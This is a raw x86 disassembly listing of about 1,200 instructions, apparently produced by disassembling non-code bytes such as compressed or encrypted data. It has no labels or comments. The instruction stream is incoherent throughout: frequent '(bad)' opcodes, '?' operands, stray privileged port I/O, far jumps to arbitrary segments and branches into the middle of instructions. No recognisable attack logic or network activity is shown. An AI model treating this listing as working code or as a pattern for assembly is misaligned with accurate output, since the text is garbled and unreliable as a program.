  40eb47:	mov    bh,0xf0
  40eb49:	mov    ?,esi
  40eb4b:	ror    BYTE PTR [edx],cl
  40eb4d:	push   ds
  40eb4e:	add    eax,0x3a27665a
  40eb53:	addr16 mov ds:0x84db,eax
  40eb57:	fwait
  40eb58:	pop    esp
  40eb59:	dec    ebp
  40eb5a:	xor    al,BYTE PTR [ecx-0x7ba05265]
  40eb60:	sub    esp,DWORD PTR [esi+0x29]
  40eb63:	(bad)
  40eb66:	cmp    al,0x55
  40eb68:	mov    edx,0x2804f958
  40eb6d:	mov    dh,0x7
  40eb6f:	clc    
  40eb70:	mov    eax,ds:0x9f16745e
  40eb75:	inc    BYTE PTR [edx+0x7a]
  40eb78:	fld    DWORD PTR [edi]
  40eb7a:	stc    
  40eb7b:	icebp  
  40eb7c:	sbb    BYTE PTR [eax],0xeb
  40eb7f:	call   0x3b7e:0x78234c3c
  40eb86:	mov    ebx,DWORD PTR [edx]
  40eb88:	out    dx,al
  40eb89:	repnz and BYTE PTR [esi+edi*2],bl
  40eb8d:	in     al,0x28
  40eb8f:	or     al,0x5
  40eb91:	adc    dl,BYTE PTR [ecx-0x2c]
  40eb94:	sub    ah,dh
  40eb96:	cmp    eax,0x6bb00128
  40eb9b:	mov    gs,WORD PTR [edi+0x73]
  40eb9e:	mov    ds:0xfc5809bd,eax
  40eba3:	repz aam 0x16
  40eba6:	scas   al,BYTE PTR es:[edi]
  40eba7:	push   eax
  40eba8:	out    0x7a,al
  40ebaa:	mov    ebp,DWORD PTR [ebx+0x5b]
  40ebad:	xchg   edi,eax
  40ebae:	das    
  40ebaf:	inc    edx
  40ebb0:	loop   0x40ec19
  40ebb2:	jbe    0x40eba8
  40ebb4:	or     esi,DWORD PTR [edi]
  40ebb6:	jle    0x40eb38
  40ebb8:	sub    BYTE PTR [ecx+0x175b3bd2],0x45
  40ebbf:	frstor fs:[ebx-0x2e669107]
  40ebc6:	xor    edx,DWORD PTR [edx+0x7c]
  40ebc9:	dec    esp
  40ebca:	fild   DWORD PTR [ebp-0x27]
  40ebcd:	maskmovq mm3,(bad)
  40ebce:	neg    DWORD PTR [ebp-0x24]
  40ebd1:	xchg   esi,eax
  40ebd2:	pop    ebp
  40ebd3:	mov    ds:0x5d9a8f48,al
  40ebd8:	xor    ch,bh
  40ebda:	push   esp
  40ebdb:	mov    bl,0x4a
  40ebdd:	mov    BYTE PTR [ebx],al
  40ebdf:	push   edx
  40ebe0:	cmp    dl,BYTE PTR [edx-0x63]
  40ebe3:	jns    0x40ec02
  40ebe5:	and    DWORD PTR [eax-0x27f3318],edx
  40ebeb:	xchg   esi,eax
  40ebed:	lods   al,BYTE PTR fs:[esi]
  40ebef:	cld    
  40ebf0:	je     0x40ebb0
  40ebf2:	xchg   ebp,eax
  40ebf3:	jae    0x40ebe0
  40ebf5:	mov    ebp,0xdc507193
  40ebfa:	retf   
  40ebfb:	enter  0x4d5c,0x89
  40ebff:	mov    ds:0x34150ba4,al
  40ec04:	loopne 0x40ebab
  40ec06:	jmp    0x34ed:0xffbe0962
  40ec0d:	mov    dl,0x1b
  40ec0f:	mov    al,ds:0xa43b02d8
  40ec14:	jnp    0x40ebaf
  40ec16:	sbb    bl,bh
  40ec18:	push   edx
  40ec19:	mov    gs,WORD PTR [ebx+0x48]
  40ec1c:	push   cs
  40ec1d:	mov    WORD PTR [ecx-0x64],ds
  40ec20:	mov    eax,ds:0xa90d92da
  40ec25:	xlat   BYTE PTR ds:[ebx]
  40ec26:	xchg   esp,eax
  40ec27:	pop    es
  40ec28:	xchg   ebx,eax
  40ec29:	mov    al,ds:0x13192d83
  40ec2e:	ins    BYTE PTR es:[edi],dx
  40ec2f:	sar    DWORD PTR ds:0x513201fc,1
  40ec35:	inc    ecx
  40ec36:	cli    
  40ec37:	stc    
  40ec38:	mov    esp,0x8d0c84c8
  40ec3d:	inc    eax
  40ec3e:	sbb    al,0x31
  40ec40:	pop    eax
  40ec41:	or     al,0x9b
  40ec43:	adc    BYTE PTR [ebx-0x74],0x81
  40ec47:	jmp    0x59a3:0x612a0ad7
  40ec4e:	and    ecx,esp
  40ec50:	stos   DWORD PTR es:[edi],eax
  40ec51:	aas    
  40ec52:	in     al,dx
  40ec53:	jnp    0x40ebda
  40ec55:	xchg   ebp,eax
  40ec56:	add    al,0x2b
  40ec58:	cmc    
  40ec59:	dec    edx
  40ec5a:	out    dx,al
  40ec5b:	mov    bh,0xaf
  40ec5d:	xor    DWORD PTR [edi+esi*2+0x12acd6b6],0xe6a1d18d
  40ec68:	inc    edx
  40ec69:	mov    al,0x61
  40ec6b:	idiv   DWORD PTR [eax]
  40ec6d:	sbb    al,0xff
  40ec6f:	inc    esp
  40ec70:	jae    0x40ecc0
  40ec72:	adc    DWORD PTR [ecx-0x113ed746],edx
  40ec78:	test   al,0xc8
  40ec7a:	std    
  40ec7b:	fimul  WORD PTR [ebp+0x2a68da79]
  40ec81:	pop    ds
  40ec82:	retf   
  40ec83:	push   0x17154e32
  40ec88:	sahf   
  40ec89:	xor    ecx,DWORD PTR [edx-0x523bd69d]
  40ec8f:	sbb    dl,dh
  40ec91:	dec    edx
  40ec92:	not    DWORD PTR [eax+0x63]
  40ec95:	or     eax,0x243c68d8
  40ec9a:	xchg   ebp,eax
  40ec9b:	neg    DWORD PTR [esi]
  40ec9d:	push   eax
  40ec9e:	lods   eax,DWORD PTR ds:[esi]
  40ec9f:	sub    DWORD PTR ds:0xaa1cbdb5,0x72150c5e
  40eca9:	dec    esi
  40ecaa:	pop    ss
  40ecab:	pop    esp
  40ecac:	mov    eax,0x6c1abf25
  40ecb1:	mov    WORD PTR [ebx+0x113a87ed],gs
  40ecb7:	stos   BYTE PTR es:[edi],al
  40ecb8:	bound  esp,QWORD PTR [ecx]
  40ecba:	mov    bh,0x42
  40ecbc:	mov    es,WORD PTR [esi-0x2f2398ff]
  40ecc2:	in     al,0x78
  40ecc4:	and    eax,0x68d671b6
  40ecc9:	pop    eax
  40ecca:	sub    edx,DWORD PTR [edi+0x5a]
  40eccd:	push   ecx
  40ecce:	xchg   ebp,eax
  40eccf:	int    0x72
  40ecd1:	jg     0x40ecd4
  40ecd3:	out    0x42,eax
  40ecd5:	add    ebp,esi
  40ecd7:	fidiv  WORD PTR [ecx]
  40ecd9:	cdq    
  40ecda:	mov    al,0x14
  40ecdc:	cmp    al,0x37
  40ecde:	cs mov dl,0x6e
  40ece1:	mov    ah,0x9e
  40ece3:	cli    
  40ece4:	js     0x40ed57
  40ece6:	pop    edx
  40ece7:	jbe    0x40ec95
  40ece9:	pop    ebp
  40ecea:	test   ebx,esi
  40ecec:	cmp    ecx,DWORD PTR [edx-0x5749d354]
  40ecf2:	fiadd  WORD PTR [eax+0x38302b82]
  40ecf8:	mov    ah,0xaf
  40ecfa:	shl    ebp,1
  40ecfc:	repz bound esp,QWORD PTR [eax+0x29]
  40ed00:	outs   dx,BYTE PTR ds:[esi]
  40ed01:	sbb    dl,BYTE PTR [eax]
  40ed03:	in     al,dx
  40ed04:	push   ss
  40ed05:	and    dl,al
  40ed07:	out    dx,al
  40ed08:	lods   eax,DWORD PTR ds:[esi]
  40ed09:	pop    ecx
  40ed0a:	scas   eax,DWORD PTR es:[edi]
  40ed0b:	inc    esp
  40ed0c:	pop    esi
  40ed0d:	sub    ch,0x63
  40ed10:	jge    0x40ed35
  40ed12:	mov    ds:0x795bba01,eax
  40ed17:	es push es
  40ed19:	lahf   
  40ed1a:	in     eax,0x7f
  40ed1c:	jbe    0x40ed41
  40ed1e:	xlat   BYTE PTR ds:[ebx]
  40ed1f:	xor    al,0x89
  40ed21:	push   eax
  40ed22:	mov    esp,0x79a36025
  40ed27:	dec    eax
  40ed28:	inc    ebx
  40ed29:	test   DWORD PTR [esi-0x6282d334],edi
  40ed2f:	pushf  
  40ed30:	dec    edi
  40ed31:	(bad)  
  40ed32:	loop   0x40ed6c
  40ed34:	lahf   
  40ed35:	test   DWORD PTR [esi],edx
  40ed37:	jnp    0x40ed35
  40ed39:	push   es
  40ed3a:	dec    edx
  40ed3b:	das    
  40ed3c:	popa   
  40ed3d:	ss pusha 
  40ed3f:	jmp    0x40ed77
  40ed41:	dec    edi
  40ed42:	sub    eax,0xabd1e90d
  40ed47:	jo     0x40ed27
  40ed49:	mov    ds:0x9427aa29,al
  40ed4e:	add    eax,0x1394910b
  40ed53:	stos   BYTE PTR es:[edi],al
  40ed54:	cwde   
  40ed55:	nop
  40ed56:	je     0x40ed03
  40ed58:	push   edi
  40ed59:	dec    edi
  40ed5a:	sub    eax,0xb16cf197
  40ed5f:	shl    ecx,1
  40ed61:	jne    0x40ed61
  40ed63:	sub    ah,BYTE PTR [edx+edx*8+0x3b4265fb]
  40ed6a:	jg     0x40ed81
  40ed6c:	retf   0xecff
  40ed6f:	test   BYTE PTR [edi+0x7d667d9c],bh
  40ed75:	fmul   st,st(4)
  40ed77:	into   
  40ed78:	mov    dh,0xde
  40ed7a:	cwde   
  40ed7b:	xor    eax,0x7296f68e
  40ed80:	mov    bl,0x4b
  40ed82:	or     eax,DWORD PTR [eax-0x37825b6d]
  40ed88:	jns    0x40edbd
  40ed8a:	sub    al,0x5a
  40ed8d:	dec    ebx
  40ed8e:	xor    DWORD PTR [edx],0x3f3179f8
  40ed94:	std    
  40ed95:	cdq    
  40ed96:	sub    BYTE PTR [edx-0x16],bh
  40ed99:	ficom  WORD PTR [esi+0x639f3672]
  40ed9f:	jmp    0x40ed9d
  40eda1:	mov    edi,0xb9314449
  40eda6:	rcr    esi,cl
  40eda8:	(bad)  
  40edaa:	out    dx,eax
  40edab:	mov    dh,0x11
  40edad:	rcl    DWORD PTR ds:0xbabe29ac,1
  40edb3:	pop    ecx
  40edb4:	push   edi
  40edb5:	(bad)  
  40edb6:	call   0xc89171e2
  40edbb:	pushf  
  40edbc:	lea    edi,ds:0x30bde4ab
  40edc2:	inc    eax
  40edc3:	into   
  40edc4:	in     al,dx
  40edc5:	aas    
  40edc6:	jne    0x40ed66
  40edc8:	not    DWORD PTR [ebx+ebp*4]
  40edcb:	enter  0x7251,0xd
  40edcf:	xchg   edi,eax
  40edd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edd1:	test   eax,0x1f64292a
  40edd6:	mov    BYTE PTR [edi-0xe1fc0ed],bl
  40eddc:	lea    esi,[eax-0x6a8a574e]
  40ede2:	fwait
  40ede3:	ret    0x691f
  40ede6:	mov    edi,0x5b44c6a0
  40edeb:	push   0x2b
  40eded:	inc    esp
  40edee:	adc    BYTE PTR [ebx+0x64],cl
  40edf1:	inc    eax
  40edf2:	fs push edi
  40edf4:	and    ch,BYTE PTR [eax+0x5c]
  40edf7:	pop    edx
  40edf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edf9:	inc    eax
  40edfa:	push   ss
  40edfb:	repnz daa 
  40edfd:	or     eax,0x95429ade
  40ee02:	add    BYTE PTR [ebx+0x64b9edc],0xb
  40ee09:	cmp    cl,BYTE PTR [eax]
  40ee0b:	jp     0x40ee61
  40ee0d:	mov    ah,0x4e
  40ee0f:	adc    DWORD PTR [ecx+0x3f],esp
  40ee12:	and    al,0x29
  40ee14:	inc    ebx
  40ee15:	or     al,0xf1
  40ee17:	nop
  40ee18:	mov    eax,0xd6907bcd
  40ee1d:	mov    al,0xf0
  40ee1f:	(bad)  
  40ee20:	mov    edi,0xf29b9af6
  40ee25:	inc    ebp
  40ee26:	sbb    al,0x9a
  40ee28:	dec    edx
  40ee29:	xor    al,0xa0
  40ee2b:	mov    eax,ds:0xa1a5148f
  40ee30:	pop    ecx
  40ee31:	lds    eax,FWORD PTR [esi-0x76]
  40ee34:	inc    esp
  40ee35:	js     0x40ee61
  40ee37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee38:	fwait
  40ee39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee3a:	xchg   ebp,ebp
  40ee3c:	stos   BYTE PTR es:[edi],al
  40ee3d:	sub    BYTE PTR [edi-0x2b5671b1],bh
  40ee43:	ja     0x40eec1
  40ee45:	mov    ah,0xe3
  40ee47:	mov    edx,0x7ad58208
  40ee4c:	daa    
  40ee4d:	dec    edx
  40ee4e:	jge    0x40ee42
  40ee50:	sbb    DWORD PTR ds:0xe4146ff4,ebp
  40ee56:	xchg   edx,eax
  40ee57:	xchg   edi,edi
  40ee59:	cmc    
  40ee5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee5b:	cmp    BYTE PTR [ecx+0xa],0x29
  40ee5f:	pop    esp
  40ee60:	sbb    eax,0xc452c50a
  40ee65:	sbb    DWORD PTR [edx+0x49],0xfb668627
  40ee6c:	cmp    ah,bh
  40ee6e:	bound  ebp,QWORD PTR [edx]
  40ee70:	ret    
  40ee71:	je     0x40ee1b
  40ee73:	xchg   edi,eax
  40ee74:	jno    0x40ee50
  40ee76:	test   DWORD PTR [ebx+eax*4-0x7ab8fac6],esp
  40ee7d:	jbe    0x40ee5d
  40ee7f:	popf   
  40ee80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee81:	in     al,dx
  40ee82:	test   bl,cl
  40ee84:	xchg   ebx,eax
  40ee85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee86:	sar    DWORD PTR [ebx-0x40],1
  40ee89:	aam    0x22
  40ee8b:	rol    DWORD PTR [eax],0xb6
  40ee8e:	mov    ah,0x60
  40ee90:	scas   eax,DWORD PTR es:[edi]
  40ee91:	jle    0x40eed1
  40ee93:	retf   
  40ee94:	imul   esi,DWORD PTR [edi+0x12],0xe432c892
  40ee9b:	add    al,0x7d
  40ee9d:	fst    st(5)
  40ee9f:	mov    cl,0xab
  40eea1:	idiv   DWORD PTR [eax-0x7a661c91]
  40eea7:	mov    BYTE PTR [edx],ch
  40eea9:	pushf  
  40eeaa:	mov    bh,0x2
  40eeac:	adc    DWORD PTR [ecx-0x62c2d916],esp
  40eeb2:	ret    0x1036
  40eeb5:	das    
  40eeb6:	faddp  st(0),st
  40eeb8:	in     al,0x71
  40eeba:	cmp    esi,DWORD PTR [ecx+0xbc2281]
  40eec0:	push   esi
  40eec1:	xchg   esi,eax
  40eec2:	cmp    DWORD PTR [ecx],0xeefa54ad
  40eec8:	jno    0x40eeea
  40eeca:	cmp    ebx,DWORD PTR [ebx+edx*2]
  40eecd:	cmp    bl,0x25
  40eed0:	xor    edx,DWORD PTR [ebx]
  40eed2:	and    DWORD PTR [edx-0x60c938bb],eax
  40eed8:	mov    edi,0x784179e0
  40eedd:	das    
  40eede:	or     bh,bl
  40eee0:	fild   WORD PTR [esi+0x43]
  40eee3:	into   
  40eee4:	je     0x40ef0a
  40eee6:	fnsave [edx+0x5]
  40eee9:	xor    BYTE PTR [ecx-0x76],ah
  40eeec:	out    0x80,eax
  40eeee:	or     bl,BYTE PTR [ecx+0x20b443a1]
  40eef4:	es out 0x0,eax
  40eef7:	jne    0x40ef36
  40eef9:	clc    
  40eefa:	sbb    bl,BYTE PTR [ecx]
  40eefc:	pop    ecx
  40eefd:	sub    ebx,ebx
  40eeff:	cdq    
  40ef00:	cmp    BYTE PTR [ebx],dl
  40ef02:	(bad)  
  40ef03:	ror    BYTE PTR [eax+0x1be2344b],1
  40ef09:	inc    edi
  40ef0a:	(bad)  [edi+0x55]
  40ef0d:	xchg   edx,eax
  40ef0e:	fadd   DWORD PTR [eax+0x4b]
  40ef11:	xchg   esi,eax
  40ef12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef13:	mov    DWORD PTR [ecx+0x6039ba94],eax
  40ef19:	inc    BYTE PTR [ecx-0x52dbe5a3]
  40ef1f:	jnp    0x40eed0
  40ef21:	xor    BYTE PTR [ebx],al
  40ef23:	mov    dh,0xbe
  40ef25:	add    edi,DWORD PTR [ebp+0x26918c01]
  40ef2b:	or     bh,0xc7
  40ef2e:	mov    cl,0x16
  40ef30:	push   edx
  40ef31:	lds    edx,FWORD PTR [edx]
  40ef33:	cmp    DWORD PTR [ebp-0x481f50ee],eax
  40ef39:	sahf   
  40ef3a:	add    ecx,esp
  40ef3c:	test   al,0xae
  40ef3e:	xchg   ecx,eax
  40ef3f:	pop    edi
  40ef40:	dec    ebx
  40ef41:	xlat   BYTE PTR ds:[ebx]
  40ef42:	pop    ds
  40ef43:	mov    bh,bh
  40ef45:	push   ebp
  40ef46:	jbe    0x40ef5e
  40ef48:	jecxz  0x40ef43
  40ef4a:	ja     0x40ef82
  40ef4c:	push   ecx
  40ef4d:	pop    esp
  40ef4e:	stos   BYTE PTR es:[edi],al
  40ef4f:	push   ebx
  40ef50:	mov    al,dl
  40ef52:	sub    ecx,edi
  40ef54:	sbb    al,0x93
  40ef56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef57:	ins    DWORD PTR es:[edi],dx
  40ef58:	xor    eax,0xdc39985f
  40ef5d:	pop    ecx
  40ef5e:	cli    
  40ef5f:	push   esp
  40ef60:	xchg   ebx,eax
  40ef61:	mov    BYTE PTR [esi+0x4],cl
  40ef64:	pop    eax
  40ef65:	xchg   ebx,eax
  40ef66:	mov    dl,0x7
  40ef68:	dec    esi
  40ef6a:	push   ebx
  40ef6b:	js     0x40ef02
  40ef6d:	jle    0x40ef1c
  40ef6f:	test   BYTE PTR [ecx],bh
  40ef71:	ret    
  40ef72:	add    DWORD PTR [edi],esi
  40ef74:	fld    DWORD PTR [edi-0x722e3aed]
  40ef7a:	inc    edi
  40ef7b:	mov    cl,0xf
  40ef7d:	mov    ah,0x9a
  40ef7f:	and    DWORD PTR [esi-0x4191d1d2],edx
  40ef85:	mov    dh,0x4b
  40ef87:	add    DWORD PTR [eax],ebp
  40ef89:	in     eax,0x7d
  40ef8b:	fsubr  QWORD PTR [eax]
  40ef8d:	jnp    0x40efcc
  40ef8f:	sub    esi,DWORD PTR [eax+0x5e]
  40ef92:	xchg   ebx,eax
  40ef93:	cld    
  40ef94:	sbb    edi,DWORD PTR [eax]
  40ef96:	stc    
  40ef97:	mov    edi,0xf4ee983b
  40ef9c:	sub    al,0xc8
  40ef9e:	or     dh,BYTE PTR [eax+0x9]
  40efa1:	inc    ebx
  40efa2:	xlat   BYTE PTR ds:[ebx]
  40efa3:	mov    ch,0xb9
  40efa5:	push   0x30cd4139
  40efaa:	dec    edi
  40efab:	jmp    0x40ef98
  40efad:	xor    BYTE PTR [edi+0x65],bh
  40efb0:	jl     0x40ef50
  40efb2:	jns    0x40ef9f
  40efb4:	ins    BYTE PTR es:[edi],dx
  40efb5:	cmp    al,al
  40efb7:	sub    BYTE PTR [eax+ecx*1-0x7b],0xa7
  40efbc:	js     0x40f02e
  40efbe:	outs   dx,BYTE PTR ds:[esi]
  40efbf:	aas    
  40efc0:	js     0x40ef91
  40efc2:	lock jecxz 0x40f020
  40efc5:	xchg   esi,eax
  40efc6:	imul   bx,WORD PTR cs:[eax-0x49],0xffc4
  40efcc:	hlt    
  40efcd:	adc    eax,0x45b468d8
  40efd2:	cmc    
  40efd3:	dec    eax
  40efd4:	rol    BYTE PTR [esi-0x4e],0x99
  40efd8:	cmp    BYTE PTR [edx],al
  40efda:	sbb    esp,DWORD PTR [ebp-0x4]
  40efdd:	ins    DWORD PTR es:[edi],dx
  40efde:	retf   
  40efdf:	push   0xe71fcc11
  40efe4:	sbb    al,0xc1
  40efe6:	adc    dh,ch
  40efe8:	rcl    cl,1
  40efea:	cmp    ah,dl
  40efec:	push   eax
  40efed:	mov    esi,0x72db85e8
  40eff2:	leave  
  40eff3:	stc    
  40eff4:	jmp    0xb1d83d9e
  40eff9:	into   
  40effa:	and    eax,0x9ef9d7ad
  40efff:	mov    al,0xd7
  40f001:	jnp    0x40efeb
  40f003:	sbb    ebp,DWORD PTR [ecx-0x59447aee]
  40f009:	mov    ds:0xc30a12be,al
  40f00e:	add    eax,0x19bc83d8
  40f013:	push   eax
  40f014:	fsub   DWORD PTR [eax+0x5d]
  40f017:	pop    edi
  40f018:	ror    BYTE PTR [esi-0x3a],1
  40f01b:	and    eax,DWORD PTR [bp+si+0x1895]
  40f020:	inc    eax
  40f021:	mov    DWORD PTR [esi-0x59],eax
  40f024:	dec    ebp
  40f025:	test   eax,0xc715ff6d
  40f02a:	push   ebx
  40f02b:	push   0xffffffb1
  40f02d:	add    BYTE PTR [eax-0x2cc714be],dh
  40f033:	mov    DWORD PTR [ebx+0xa6cc5ec],edi
  40f039:	test   DWORD PTR [ecx*4+0x40511566],0x3d386880
  40f044:	xchg   DWORD PTR [ecx-0x49],ecx
  40f047:	pmaxub mm6,mm6
  40f04a:	inc    ebp
  40f04b:	and    al,0x18
  40f04d:	rcl    DWORD PTR [esi+0x37bf8c7a],1
  40f053:	sbb    BYTE PTR [ebp+0x53],0xdf
  40f057:	cmp    al,bh
  40f059:	fcmove st,st(0)
  40f05b:	xor    DWORD PTR [esi+edx*4-0x62d5e250],edi
  40f062:	mov    ds,WORD PTR [eax+eax*2+0x5c]
  40f066:	push   ds
  40f067:	add    DWORD PTR ds:[ecx+0x8],0x33773e5f
  40f06f:	dec    ebx
  40f070:	mov    bh,0xea
  40f072:	ss jb  0x40f0f3
  40f075:	sbb    eax,0x5934424
  40f07a:	add    BYTE PTR [ebp-0x16],al
  40f07d:	loopne 0x40f0c6
  40f07f:	cmp    eax,0x29873e59
  40f084:	mov    edx,DWORD PTR [ebx+0xe0b3abd]
  40f08a:	or     edx,DWORD PTR [edx]
  40f08c:	jecxz  0x40f01b
  40f08e:	mov    bh,0xd8
  40f090:	(bad)  
  40f091:	push   esp
  40f092:	dec    eax
  40f093:	inc    esi
  40f094:	add    eax,0xf07bcea1
  40f099:	ins    BYTE PTR es:[edi],dx
  40f09a:	pop    ds
  40f09b:	ds push es
  40f09d:	fadd   st(2),st
  40f09f:	dec    ebx
  40f0a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0a1:	cli    
  40f0a2:	mov    ebx,0x8f6652d2
  40f0a7:	push   ebx
  40f0a8:	pop    ds
  40f0a9:	lahf   
  40f0aa:	mov    dh,0xdb
  40f0ac:	xor    BYTE PTR [eax],cl
  40f0ae:	jecxz  0x40f066
  40f0b0:	pop    esp
  40f0b1:	xor    cl,bh
  40f0b3:	xor    dh,BYTE PTR [edx]
  40f0b5:	ret    0x6bff
  40f0b8:	dec    ebp
  40f0b9:	xor    eax,0xdf2263cf
  40f0be:	daa    
  40f0bf:	inc    eax
  40f0c0:	mov    eax,ds:0x19de5769
  40f0c5:	(bad)  
  40f0c6:	aad    0xc0
  40f0c8:	mov    BYTE PTR [ebx],cl
  40f0ca:	adc    eax,0x67b70f4f
  40f0cf:	sub    dh,al
  40f0d1:	fdiv   QWORD PTR [eax]
  40f0d3:	into   
  40f0d4:	mov    esi,0x4e80ae82
  40f0d9:	rcl    DWORD PTR [edx],0x37
  40f0dc:	xor    al,0x8a
  40f0de:	hlt    
  40f0df:	jno    0x5a52a761
  40f0e5:	lods   al,BYTE PTR ds:[esi]
  40f0e6:	out    0x2c,eax
  40f0e8:	out    dx,al
  40f0e9:	push   edx
  40f0ea:	fwait
  40f0eb:	pop    ebx
  40f0ec:	push   esi
  40f0ed:	push   ebp
  40f0ee:	lods   eax,DWORD PTR ds:[esi]
  40f0ef:	pop    edi
  40f0f0:	lock sub BYTE PTR [ebx-0x7a],ch
  40f0f4:	lods   eax,DWORD PTR ds:[esi]
  40f0f5:	(bad)  
  40f0f8:	outs   dx,DWORD PTR ds:[esi]
  40f0f9:	fcomp  QWORD PTR [edi-0x12f80fc7]
  40f0ff:	inc    esi
  40f100:	fwait
  40f101:	cmp    BYTE PTR [eax],cl
  40f103:	jp     0x40f139
  40f105:	adc    ah,dh
  40f107:	sub    al,0x8e
  40f109:	in     eax,0x99
  40f10b:	outs   dx,BYTE PTR ds:[esi]
  40f10c:	push   esi
  40f10d:	xchg   ebp,eax
  40f10e:	lods   al,BYTE PTR ds:[esi]
  40f10f:	inc    esi
  40f110:	jne    0x40f0a4
  40f112:	arpl   bx,ax
  40f114:	sbb    BYTE PTR [esi+ebp*4],dl
  40f117:	sbb    BYTE PTR [ebx-0x66],bl
  40f11a:	inc    esi
  40f11b:	cmp    BYTE PTR [eax+0x2],bh
  40f11e:	push   edi
  40f11f:	dec    ecx
  40f120:	(bad)  
  40f121:	or     edi,DWORD PTR [edi-0x6336af57]
  40f127:	sbb    eax,0xf4ab9a87
  40f12c:	push   es
  40f12d:	cmp    eax,0x9cca11f6
  40f132:	lock das 
  40f134:	add    al,0xd
  40f136:	sbb    eax,0x38fdbef3
  40f13b:	add    BYTE PTR [ebx-0x3198514],bl
  40f141:	dec    edi
  40f142:	and    al,0x6c
  40f144:	adc    eax,0x8a2bd636
  40f149:	repz icebp 
  40f14b:	xchg   ebp,eax
  40f14c:	inc    ecx
  40f14d:	mov    ds:0xb7d1bdc9,eax
  40f152:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f153:	mov    ebx,DWORD PTR [esi-0x37544f]
  40f159:	add    dh,BYTE PTR [esi+0xce2c03c]
  40f15f:	std    
  40f160:	jae    0x40f19f
  40f162:	test   DWORD PTR [esp+ebx*1-0x6508ba5c],edi
  40f169:	sub    eax,0xb38dbda8
  40f16e:	sub    al,BYTE PTR [ecx]
  40f170:	fucom  st(1)
  40f172:	add    BYTE PTR [ebx+0x59cdded6],0xdc
  40f179:	out    dx,eax
  40f17a:	jno    0x40f1dc
  40f17c:	dec    ebx
  40f17d:	sub    bh,cl
  40f17f:	nop
  40f180:	xor    al,0x6d
  40f182:	xchg   esp,eax
  40f183:	adc    eax,0x89af9515
  40f188:	jne    0x40f18c
  40f18a:	cli    
  40f18b:	aam    0x32
  40f18d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f18e:	mov    al,ds:0x94e23b71
  40f193:	push   0xfe378f8f
  40f198:	sub    BYTE PTR [eax+0x1439c8e7],dl
  40f19e:	call   0x5fc1:0xfd65815f
  40f1a5:	iret   
  40f1a6:	dec    edi
  40f1a7:	or     cl,bh
  40f1a9:	mov    dh,0x32
  40f1ab:	xchg   esp,eax
  40f1ac:	mov    ah,0x8e
  40f1ae:	pushf  
  40f1af:	push   ebp
  40f1b0:	cmp    eax,0x404ab0be
  40f1b5:	cdq    
  40f1b6:	inc    ebp
  40f1b7:	(bad)  
  40f1b8:	mov    edi,0xe94e00f1
  40f1bd:	test   al,0xba
  40f1bf:	int3   
  40f1c0:	ins    BYTE PTR es:[edi],dx
  40f1c1:	repnz push edx
  40f1c3:	in     al,dx
  40f1c4:	sub    al,0xea
  40f1c6:	push   ebx
  40f1c7:	std    
  40f1c8:	rol    cl,0x7b
  40f1cb:	jle    0x40f21c
  40f1cd:	xlat   BYTE PTR ds:[ebx]
  40f1ce:	xchg   edx,eax
  40f1cf:	push   ds
  40f1d0:	xchg   ebx,eax
  40f1d1:	pop    es
  40f1d2:	ins    BYTE PTR es:[edi],dx
  40f1d3:	clc    
  40f1d4:	xchg   ch,ch
  40f1d6:	shl    DWORD PTR [edx-0x49],cl
  40f1d9:	push   edi
  40f1da:	mov    ebp,0xc134c3cc
  40f1df:	sub    DWORD PTR [edx],edi
  40f1e1:	je     0x40f22d
  40f1e3:	ficomp WORD PTR [esi+eax*4-0x7b]
  40f1e7:	std    
  40f1e8:	(bad)  
  40f1e9:	repnz test DWORD PTR [ebp+0x40],0x9280460d
  40f1f1:	pop    ebp
  40f1f2:	inc    BYTE PTR [edx+0x5a279aa3]
  40f1f8:	(bad)  
  40f1f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1fa:	popa   
  40f1fb:	jnp    0x40f196
  40f1fd:	sub    BYTE PTR [ebx+ebx*1+0x3d186820],0x9f
  40f205:	data16 in al,0xb6
  40f208:	std    
  40f209:	xlat   BYTE PTR ds:[ebx]
  40f20a:	xchg   DWORD PTR [ebp+eiz*8-0x4a20f625],ecx
  40f211:	mov    bl,0x1d
  40f213:	inc    esi
  40f214:	cmp    esi,DWORD PTR [edi]
  40f216:	sti    
  40f217:	out    0x27,eax
  40f219:	cld    
  40f21a:	mov    eax,?
  40f21c:	lods   al,BYTE PTR cs:[esi]
  40f21e:	mov    esp,0xba7e034c
  40f223:	and    DWORD PTR [esi+0x59],edx
  40f226:	dec    eax
  40f227:	push   ebp
  40f228:	add    ebp,esi
  40f22a:	push   ecx
  40f22b:	cmp    eax,0x25d7c5e4
  40f230:	dec    ebp
  40f231:	hlt    
  40f232:	out    dx,al
  40f233:	ret    0x58c7
  40f236:	dec    ebx
  40f237:	neg    BYTE PTR [esi+ebp*4]
  40f23a:	adc    eax,0x5edb5d18
  40f23f:	push   ds
  40f240:	sbb    edx,ebp
  40f242:	repnz mov bh,0x3
  40f245:	adc    al,0xb6
  40f247:	mov    dh,0xf5
  40f249:	js     0x40f1f8
  40f24b:	mov    esp,0xda242a7a
  40f250:	and    eax,0x1716f078
  40f255:	inc    ecx
  40f256:	test   DWORD PTR [ebx-0x10e51ed9],edi
  40f25c:	jb     0x40f228
  40f25e:	retf   
  40f25f:	inc    esi
  40f260:	outs   dx,BYTE PTR ds:[esi]
  40f261:	pop    eax
  40f262:	popa   
  40f263:	cld    
  40f264:	mov    al,0x4e
  40f266:	pop    DWORD PTR [edi+0x3e0b402a]
  40f26c:	xor    eax,0x81d3b3e7
  40f271:	or     al,0x76
  40f273:	or     BYTE PTR [ebx+0x3fae2589],al
  40f279:	or     BYTE PTR [edi-0x7a0cad16],bh
  40f27f:	test   eax,0x7a32583b
  40f284:	jns    0x40f22a
  40f286:	sti    
  40f287:	aas    
  40f288:	mov    WORD PTR [ecx+0x7e223dd2],fs
